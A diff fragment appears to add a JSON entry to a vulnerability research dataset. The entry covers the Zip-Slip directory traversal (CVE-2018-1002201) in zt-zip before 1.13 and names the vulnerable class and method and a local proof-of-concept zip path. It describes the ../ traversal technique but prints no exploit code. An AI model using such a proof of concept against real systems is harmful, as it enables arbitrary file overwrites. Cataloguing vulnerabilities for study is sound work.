+    "CVE_Library_version": "<1.13",
+    "CVE_Library_url": "https://github.com/zeroturnaround/zt-zip/commit/759b72f33bc8f4d69f84f09fcb7f010ad45d6fff",
+    "CVE_POC": "/Users/jiajunyu/paper/exploitvul/cve_data_test/src/main/file/CVE-2018-1002201.zip",
+    "CVE_Description": "zt-zip before 1.13 is vulnerable to directory traversal, allowing attackers to write to arbitrary files via a ../ (dot dot slash) in a Zip archive entry that is mishandled during extraction. This vulnerability is also known as 'Zip-Slip'.",
+    "CVE_Class": "org.zeroturnaround.zip.ZipUtil",
+    "CVE_Method": "unpack(java.io.File,java.io.File):void"
+  }
+]
